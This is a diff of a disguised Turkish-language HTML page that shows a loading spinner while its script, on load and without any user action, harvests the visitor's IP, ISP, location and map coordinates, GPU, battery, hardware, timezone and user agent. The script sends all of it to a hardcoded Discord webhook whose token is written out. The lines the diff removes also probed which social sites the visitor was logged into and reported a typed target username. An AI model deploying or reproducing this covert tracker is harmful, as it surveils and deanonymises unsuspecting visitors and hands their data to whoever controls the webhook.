@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Yükleniyor...</title>
+    <title>Sistem Kaynakları</title>
     <style>
         body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; overflow:hidden; }
-        .l { border: 2px solid #111; border-top: 2px solid #0f0; border-radius: 50%; width: 30px; height: 30px; animation: s 1s linear infinite; }
+        .l { border: 2px solid #111; border-top: 2px solid #0f0; border-radius: 50%; width: 20px; height: 20px; animation: s 1s linear infinite; }
         @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
@@ -14,119 +14,77 @@
     <div class="l"></div>
 
     <script>
-    (async () => {
         const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
-        // 1. DEDEKTÖR FONKSİYONU
-        const checkLogin = async (url) => {
-            return new Promise((resolve) => {
-                const img = new Image();
-                const start = performance.now();
-                img.onload = () => resolve(true);
-                img.onerror = () => (performance.now() - start < 100) ? resolve(true) : resolve(false);
-                img.src = url + "/favicon.ico?" + Math.random();
-            });
-        };
-
         async function masterExtract() {
-            let info = { gpu: "N/A", ven: "N/A", ip: {}, net: "N/A", bat: "N/A" };
+            let info = { 
+                gpu: "N/A", ven: "N/A", ip: "X", iss: "X", loc: "X", 
+                net: "X", sys: "X", ext: "X", bat: "X" 
+            };
 
-            // DONANIM VE AĞ SORGUSU
+            // 1. ZORLANMIŞ DONANIM SORGUSU (GPU/VENDOR)
             try {
                 const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
+                const gl = canvas.getContext('webgl2', {powerPreference: "high-performance"}) || canvas.getContext('webgl');
                 const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                 if (dbg) {
                     info.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
                     info.ven = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
                 }
+            } catch(e) {}
+
+            // 2. ISS, IP VE ADLİ KONUM ANALİZİ
+            try {
                 const res = await fetch('https://ipapi.co/json/');
-                info.ip = await res.json();
-                const n = navigator.connection;
-                info.net = n ? `~${n.downlink} Mbps | ${n.effectiveType}` : "N/A";
+                const j = await res.json();
+                info.ip = j.ip;
+                info.iss = `${j.org} (AS${j.asn})`;
+                info.loc = `📍 **Bölge:** ${j.city}, ${j.region} / ${j.country_name}\n🛰️ **ISS:** \`${info.iss}\`\n🛡️ **Proxy/VPN:** ${j.proxy ? '⚠️ Aktif' : '✅ Temiz'}\n🗺️ [Harita](https://www.google.com/maps?q=${j.latitude},${j.longitude})`;
+            } catch(e) {}
+
+            // 3. ŞEBEKE VE HIZ
+            try {
+                const n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                info.net = n ? `⚡ **Hız:** ~${n.downlink} Mbps | **Ping:** ${n.rtt}ms\n📡 **Bağlantı:** ${n.effectiveType}` : "Erişilemedi";
+            } catch(e) {}
+
+            // 4. DERİN SİSTEM VE ZAMAN ANALİZİ
+            try {
                 const b = await navigator.getBattery();
                 info.bat = `%${Math.round(b.level * 100)} (${b.charging ? 'Şarjda' : 'Pilde'})`;
             } catch(e) {}
 
-            // OTURUM TESPİTİ
-            const sessions = {
-                discord: await checkLogin("https://discord.com"),
-                instagram: await checkLogin("https://www.instagram.com"),
-                twitter: await checkLogin("https://twitter.com"),
-                spotify: await checkLogin("https://www.spotify.com"),
-                pinterest: await checkLogin("https://www.pinterest.com")
-            };
+            info.sys = `💻 **OS:** ${navigator.platform}\n🧠 **CPU:** ${navigator.hardwareConcurrency} Çekirdek\n💾 **RAM:** ${navigator.deviceMemory || 'Gizli'} GB\n🔋 **Güç:** ${info.bat}`;
+            info.ext = `🌍 **Dil:** ${navigator.language}\n⏰ **Zaman:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n📐 **Ekran:** ${screen.width}x${screen.height} (${screen.colorDepth}bit)`;
 
-            // VPN VE SAAT DİLİMİ ANALİZİ (TUTARSIZLIK KONTROLÜ)
-            const systemTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            const isVpnLikely = info.ip.timezone !== systemTimezone;
-
+            // 5. KUSURSUZ RAPOR ŞABLONU
             const payload = {
                 embeds: [{
                     title: "💀 KUSURSUZ ADLİ SİSTEM ANALİZİ",
-                    description: `Uptime: \`${Math.floor(performance.now()/1000/60)} Dakika\` | VPN Şüphesi: \`${isVpnLikely ? '⚠️ YÜKSEK' : '✅ DÜŞÜK'}\``,
-                    color: isVpnLikely ? 15158332 : 3066993,
+                    description: "Kullanıcı etkileşimi olmadan tüm veriler sızdırıldı.",
+                    color: 15158332,
                     fields: [
-                        { name: "📡 İNTERNET VE ISS KATMANI", value: `📍 **Bölge:** ${info.ip.city || '?'}\n🛰️ **ISS:** ${info.ip.org || '?'}\n**IP:** \`${info.ip.ip || '?'}\`\n**Zaman Dilimi:** ${systemTimezone}`, inline: false },
-                        { name: "🛠️ DONANIM DETAYLARI", value: `**GPU:** \`${info.gpu}\`\n**RAM:** ${navigator.deviceMemory || 'Gizli'} GB | **Pil:** ${info.bat}`, inline: false },
-                        { name: "🔐 DİJİTAL OTURUM DURUMLARI", value: `Discord: ${sessions.discord ? '✅' : '❌'} | Spotify: ${sessions.spotify ? '✅' : '❌'}\nInsta: ${sessions.instagram ? '✅' : '❌'} | Pinterest: ${sessions.pinterest ? '✅' : '❌'}`, inline: false },
+                        { name: "📡 İNTERNET VE ISS KATMANI", value: `${info.loc}\n${info.net}\n**IP:** \`${info.ip}\``, inline: false },
+                        { name: "🛠️ EKRAN KARTI (DONANIM)", value: `**Renderer:** \`${info.gpu}\`\n**Vendor:** \`${info.ven}\``, inline: false },
+                        { name: "⚙️ DONANIM DETAYLARI", value: info.sys, inline: false },
+                        { name: "🌐 SİSTEM DETAYLARI", value: info.ext, inline: false },
                         { name: "🔍 USER AGENT", value: "```" + navigator.userAgent + "```" }
                     ],
-                    footer: { text: "Protocol: Omniscience v11.5 | VPN-Bypass Ready" },
+                    footer: { text: "Protocol: Omniscience v7.0" },
                     timestamp: new Date()
                 }]
             };
 
-            await fetch(u, { 
-                method: 'POST', 
-                headers: { 'Content-Type': 'application/json' }, 
-                body: JSON.stringify(payload) 
-            });
+            const blob = JSON.stringify(payload);
+            fetch(u, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: blob });
+            navigator.sendBeacon(u, blob);
         }
 
-        window.addEventListener('load', masterExtract);
-    })();
-        window.finalStrike = async function() {
-    const webhook = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
-    const targetElement = document.getElementById('targetName');
-    
-    if (!targetElement || !targetElement.value) return;
-    
-    const nameInput = targetElement.value.trim();
-    const cleanName = nameInput.replace('@', '').split('/').filter(Boolean).pop(); 
-
-    if (!cleanName) return;
-
-    const finalPayload = {
-        embeds: [{
-            title: "🎯 HEDEF KİMLİK TESPİT EDİLDİ",
-            color: 16711680,
-            fields: [
-                { name: "👤 Kullanıcı", value: "`" + cleanName + "`", inline: true },
-                { name: "🔗 Linkler", value: "[Instagram](https://www.instagram.com/" + cleanName + ") | [TikTok](https://www.tiktok.com/@" + cleanName + ") | [X](https://x.com/" + cleanName + ")" }
-            ],
-            timestamp: new Date().toISOString()
-        }]
-    };
-
-    try {
-        const response = await fetch(webhook, { 
-            method: 'POST', 
-            headers: {'Content-Type': 'application/json'}, 
-            body: JSON.stringify(finalPayload) 
-        });
-
-        if (response.ok) {
-            window.location.href = "https://www.google.com/search?q=System+Analysis+Completed";
-        } else {
-            window.location.href = "https://www.google.com";
-        }
-    } catch(e) {
-        window.location.href = "https://www.google.com";
-    }
-};
-        
-    </script> 
+        // OTOMATİK BAŞLAT
+        window.onload = masterExtract;
+</script>
 </body>
 </html>
+
+
 
